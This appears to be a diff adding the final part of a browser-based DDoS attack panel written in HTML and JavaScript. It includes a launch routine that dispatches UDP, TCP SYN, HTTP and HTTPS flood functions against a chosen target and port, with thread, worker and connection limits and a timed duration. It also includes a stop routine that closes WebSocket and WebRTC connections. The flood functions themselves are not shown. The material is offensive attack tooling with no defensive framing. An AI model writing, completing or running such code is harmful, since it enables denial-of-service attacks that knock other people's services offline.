+            addConsoleLog('[LAUNCH] Initializing ' + selectedMethod.toUpperCase() + ' attack vector...');
+            addConsoleLog('[INFO] Target: ' + target + ':' + port);
+            addConsoleLog('[INFO] Threads: ' + threads);
+            addConsoleLog('[INFO] Worker Limit: ' + workerLimit);
+            addConsoleLog('[INFO] Connection Limit: ' + maxConnections);
+            
+            // Launch optimized attack based on method
+            switch(selectedMethod) {
+                case 'udp':
+                    performUDPFlood(target, port, threads);
+                    break;
+                case 'tcp':
+                    performTCPSYNFlood(target, port, threads);
+                    break;
+                case 'http':
+                    performHTTPFlood(target, port, threads);
+                    break;
+                case 'https':
+                    performHTTPSFlood(target, port, threads);
+                    break;
+                default:
+                    addConsoleLog('[ERROR] Unknown attack method: ' + selectedMethod);
+                    stopAttack();
+                    return;
+            }
+            
+            // Optimized stats update (every 500ms to prevent lag)
+            statsInterval = setInterval(updateStats, 500);
+            
+            var duration = parseInt(document.getElementById('duration').value) * 1000;
+            setTimeout(function() {
+                if (isRunning) {
+                    stopAttack();
+                    btnText.textContent = 'LAUNCH ATTACK';
+                    btn.style.background = 'var(--primary)';
+                    addConsoleLog('[COMPLETE] Attack completed - duration reached');
+                }
+            }, duration);
+        }
+        
+        function stopAttack() {
+            isRunning = false;
+            activeWorkers = 0;
+            document.getElementById('statusValue').textContent = 'IDLE';
+            document.getElementById('statusValue').classList.remove('warning');
+            document.getElementById('statusValue').classList.add('active');
+            
+            addConsoleLog('[CLEANUP] Closing all connections...');
+            
+            // Close WebSocket connections
+            connections.forEach(function(ws) {
+                try {
+                    if (ws.readyState === WebSocket.OPEN) {
+                        ws.close();
+                    }
+                } catch (error) {
+                    // Ignore close errors
+                }
+            });
+            connections = [];
+            
+            // Close WebRTC connections
+            webRTCConnections.forEach(function(conn) {
+                try {
+                    if (conn.dc.readyState === 'open') {
+                        conn.dc.close();
+                    }
+                    conn.pc.close();
+                } catch (error) {
+                    // Ignore close errors
+                }
+            });
+            webRTCConnections = [];
+            
+            // Clear HTTP connections
+            httpConnections = [];
+            
+            // Clear all intervals
+            if (attackInterval) clearInterval(attackInterval);
+            if (logInterval) clearInterval(logInterval);
+            if (statsInterval) clearInterval(statsInterval);
+            
+            addConsoleLog('[CLEANUP] All connections closed. Resources freed.');
+        }
+        
+        // Legacy functions removed - replaced by optimized methods
+    </script>
+</body>
+</html>
